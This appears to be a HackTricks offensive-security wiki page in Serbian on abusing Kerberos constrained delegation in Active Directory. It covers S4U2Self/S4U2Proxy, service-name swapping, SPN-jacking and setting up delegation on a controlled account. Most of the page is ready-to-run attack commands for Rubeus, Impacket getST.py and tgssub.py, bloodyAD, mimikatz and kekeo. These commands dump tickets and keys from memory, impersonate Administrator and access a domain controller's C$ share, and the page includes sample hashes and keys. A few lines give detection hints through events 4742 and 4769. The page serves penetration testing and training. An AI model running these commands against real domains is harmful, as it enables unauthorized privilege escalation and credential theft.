# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Pomoću ovoga Domain admin može **dozvoliti** računaru da se **predstavlja kao korisnik ili računar** prema bilo kom **servisu** na mašini.

- **Service for User to self (_S4U2self_):** Svaki **service account koji poseduje SPN** obično može da pribavi TGS za sebe u ime proizvoljnog korisnika. Ako nalog takođe ima [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) u _userAccountControl_, taj TGS je **forwardable**, što omogućava da protocol transition bude direktno koristan za **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **Service account** može da pribavi TGS u ime korisnika za SPN-ove navedene u **msDS-AllowedToDelegateTo**. Evidence ticket koji se koristi u S4U2Proxy mora biti **forwardable** ticket za delegirajući servis: ili pravi client-to-service ticket uhvaćen od žrtve ili ticket generisan pomoću **S4U2Self + T2A4D**.

**Napomena**: Ako je korisnik u AD označen kao „_Account is sensitive and cannot be delegated_“ ili je član grupe **Protected Users**, obično **nećete moći da se predstavljate kao on** pomoću constrained delegation. U modernim domenima, pri ciljanju naloga sa omogućenim delegation-om, dajte prednost **AES** materijalu u odnosu na pretpostavke zasnovane isključivo na RC4.

To znači da, ako **kompromitujete hash servisa**, možete **da se predstavljate kao korisnici** i u njihovo ime ostvarite **pristup** bilo kom **servisu** na navedenim mašinama (što može dovesti do **privesc**).

Štaviše, **nećete imati pristup samo servisu za koji korisnik može da se predstavlja, već i bilo kom servisu**, jer se SPN (traženi naziv servisa) ne proverava (u ticket-u ovaj deo nije šifrovan/potpisan). Zato, ako imate pristup **CIFS servisu**, možete imati pristup i **HOST servisu** koristeći, na primer, `/altservice` flag u Rubeus-u. Istu slabost zamene SPN-a zloupotrebljavaju **Impacket getST -altservice** i drugi alati.

Takođe, za eksploataciju **DCSync** potreban je **LDAP service** pristup na DC.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Napomena za operatera:** nemojte se oslanjati samo na snimke ekrana iz **ADUC** ili BloodHound-a pri pregledu naloga **gMSA/sMSA**. Ti nalozi često ne prikazuju uobičajenu karticu Delegation, zato direktno enumerišite sirove atribute **`userAccountControl`** i **`msDS-AllowedToDelegateTo`**.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protokolna tranzicija naspram Kerberos-only ograničene delegacije

Ako kompromitovani nalog ima **T2A4D**, obično možete da dovršite ceo lanac **`S4U2Self -> S4U2Proxy`** samo pomoću ključa usluge/TGT-a.<sup>[[2]](#references)</sup>

Ako ima samo **`msDS-AllowedToDelegateTo`** (klasični režim **„Use Kerberos only“**), delegacija se i dalje može zloupotrebiti, ali dokazni tiket za S4U2Proxy mora biti **forwardable korisnički tiket za uslugu** delegirajuće usluge. Jedan način je da preuzmete žrtvin TGS iz **LSASS/ccache** i prosledite ga drugoj fazi (`/tgs:` u Rubeus-u). **Non-forwardable** S4U2Self tiket **nije** dovoljan za klasičnu ograničenu delegaciju; ako je to vaš jedini dokazni tiket, umesto toga proverite [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

Drugi uslovni način je prvi [RBCD](resource-based-constrained-delegation.md) korak do delegirajuće usluge: ako on proizvede **forwardable** tiket za predviđenog korisnika i uslugu, taj tiket se može testirati kao dokaz za kasniji Kerberos-only S4U2Proxy korak. Proverite zastavice prvog tiketa, SPN delegirajuće usluge, listu dozvoljenih ciljeva i sva ograničenja korisničke delegacije; sama kontrola nad RBCD atributom ne potvrđuje da je drugi korak moguć.

### Napomene o ograničenoj delegaciji između domena (2025+)

Od **Windows Server 2012/2012 R2**, KDC podržava **ograničenu delegaciju između domena/šuma** putem S4U2Proxy proširenja. Moderne verzije (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SID-a koji označavaju protokolnu tranziciju:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) kada je korisnik normalno autentifikovan.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) kada je usluga potvrdila identitet putem protokolarne tranzicije.

Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protokolarna tranzicija koristi između domena; to potvrđuje da je S4U2Proxy korak uspeo.<sup>[[1]](#references)</sup>

### Impacket / Linux alati (altservice i puni S4U)

Novije verzije Impacket-a (0.11.x+) izlažu isti S4U lanac i SPN zamenu kao Rubeus:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Ako želite da prvo napravite korisnički ST (npr. kada imate samo offline hash), koristite **ticketer.py** zajedno sa **getST.py** za S4U2Proxy. **tgssub.py** je takođe koristan kada već imate funkcionalan ccache i treba samo da zamenite klasu servisa za isti host. Pogledajte otvoreni Impacket issue #1713 za trenutno poznate probleme (KRB_AP_ERR_MODIFIED kada se forged ST ne podudara sa SPN ključem).<sup>[[2]](#references)</sup>

### SPN-jacking: preusmeravanje cilja constrained delegation

Klasični constrained delegation ovlašćuje **SPN string** u `msDS-AllowedToDelegateTo`, a ne nepromenljivi SID cilja. Tokom S4U2Proxy, KDC razrešava nalog koji trenutno poseduje taj SPN i šifruje service ticket dugoročnim ključem tog naloga. Zato kontrola nad delegirajućim nalogom, uz `WriteSPN` nad drugim nalogom servisa/računara, može da preusmeri nepromenjeno ograničenje delegacije bez `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Postoje dve varijante:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** dozvoljeni SPN je napušten jer je njegov prethodni vlasnik obrisan, preimenovan ili mu je SPN uklonjen. Dodajte ga direktno na željeni ciljni nalog.
- **Live SPN-jacking:** SPN i dalje pripada izvornom nalogu. Validacija dupliranih SPN-ova obično blokira upis na odredištu, pa je potreban `WriteSPN` nad oba objekta: uklonite SPN sa izvora, dodajte ga cilju, preuzmite ticket, a zatim vratite prvobitnu registraciju.

Sledeći apstraktni Linux tok premešta dozvoljeni SPN, pokreće S4U kao kompromitovani delegirajući principal i prepisuje naziv servisa u ticket-u u naziv korisnog servisa na novom cilju.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` je drugi, zaseban primitiv. S4U2Proxy tiket je šifrovan za nalog koji sada poseduje `$DELEGATED_SPN`; pošto je naziv servisa u tiketu (`sname`) izvan šifrovanog tela tiketa, alati mogu da zamene drugom klasom servisa/hostname-om čiji servis koristi isti ključ naloga. SPN-jacking najpre menja **koji ključ naloga** štiti tiket, dok zamena klase servisa menja **gde se tiket predstavlja**.<sup>[[5]](#references)[[6]](#references)</sup>

Za aktivni jacking, obrnite redosled dva LDAP upisa odmah nakon pribavljanja tiketa da ne biste poremetili legitimni servis. Na DC-ovima na kojima je omogućena revizija naloga računara, tražite Security događaj **4742** u kom je `servicePrincipalName` uklonjen sa jednog računara, a ubrzo zatim dodat drugom, naročito kada se hostname SPN-a razlikuje od vrednosti `dNSHostName` odredišta. Povežite ovo sa događajem **4769**: S4U2Self navodi isti nalog kao klijenta i servis, dok S4U2Proxy popunjava polje **Transited Services**.<sup>[[5]](#references)</sup>

### Konfigurisanje delegiranja na kontrolisanom nalogu

Ovaj postupak zahteva **efikasan pristup za pisanje** atributima delegiranja naloga računara ili servisa (na primer, `GenericAll` ili `WriteDACL`, nakon čega sledi promena ACL-a) **i** korisničko pravo `SeEnableDelegationPrivilege` za nalog koji vrši LDAP izmenu. Microsoft zahteva ovo pravo prilikom izmene `msDS-AllowedToDelegateTo`; sama prava za kontrolu objekta nisu dovoljna da ga zaobiđu. Proverite oba preduslova pre nego što LDAP klijentom kao što je **bloodyAD** podesite delegiranje uz promenu protokola.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Postojeći nalog računara može biti kandidat čak i kada je `ms-DS-MachineAccountQuota` nula; ta kvota ograničava podrazumevani način kreiranja novih računara, a ne prava nad postojećim objektom. Da biste koristili konfigurisanu delegaciju, potrebno je i da imate kontrolu nad ključem ili lozinkom naloga koji delegira, važeći service principal name i ciljnog korisnika čiji akreditivi mogu da se delegiraju. Ove uslove i efektivni pristup direktorijumu treba proveriti zasebno.

- Korak 1: **Preuzmite TGT dozvoljene usluge**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Postoje **i drugi načini da se pribavi TGT ticket** ili **RC4** ili **AES256** bez SYSTEM privilegija na računaru, kao što su Printer Bug i unconstrained delegation, NTLM relaying i zloupotreba Active Directory Certificate Service
>
> **Samo posedovanje tog TGT ticketa (ili heša) dovoljno je da izvedete ovaj napad bez kompromitovanja celog računara.**

- Korak 2: **Preuzmite TGS za uslugu predstavljajući se kao korisnik**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Više informacija na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) i [**Kerberosity je ubio domen: ofanzivni pregled Kerberosa**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Pregled ograničene Kerberos delegacije (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Zloupotreba delegacije pomoću Impacket-a (2. deo): Ograničena delegacija (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Ograničena Kerberos delegacija (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity je ubio domen: ofanzivni pregled Kerberosa (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: Granični slučaj zloupotrebe WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
